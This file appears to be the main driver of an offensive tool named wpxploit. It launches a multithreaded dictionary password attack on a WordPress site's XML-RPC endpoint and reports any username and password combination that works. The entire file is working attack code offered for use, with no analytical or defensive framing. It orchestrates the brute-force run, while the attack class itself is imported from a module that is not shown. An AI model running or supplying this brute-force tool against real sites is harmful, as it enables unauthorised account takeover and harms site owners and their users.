from sys import argv
from wpxploit.xmlrpc.exploit import DictionaryAttack
from wpxploit.xmlrpc.requester import XmlrpcDoesNotExist
from wpxploit.general.wordlist import read_word_list, show_word_list
from wpxploit.general.interface import (
    help, banner, current_time,
    url_check, connection_check,
    get_user_name
)


@banner
@url_check
@connection_check
def main(url: str, thread_size: int, timeout: int) -> None:
    user_name = get_user_name()
    word_list = show_word_list()

    word_chunks = read_word_list(word_list, thread_size)
    thread_list = []
    result = None

    for pass_word in word_chunks:
        if pass_word == []:
            continue
        try:
            thread = DictionaryAttack(url, user_name, pass_word, timeout)
            thread.daemon = True
            thread.start()
            thread_list.append(thread)
        except XmlrpcDoesNotExist as message:
            print(current_time(), message)
            break

    for thread in thread_list:
        try:
            result = thread.join()
            if result is not None:
                break
        except KeyboardInterrupt:
            if thread.is_alive():
                thread.stop()
                thread.join()

    if result is not None:
        print(current_time(), "{}:{} is valid!".format(
              result.get("user_name"), result.get("pass_word")))

    print(current_time(), "all task are done!")


if __name__ == "__main__":
    if len(argv) != 4:
        help()
    url, thread, timeout = argv[1], int(argv[2]), int(argv[3])
    main(url, thread, timeout)
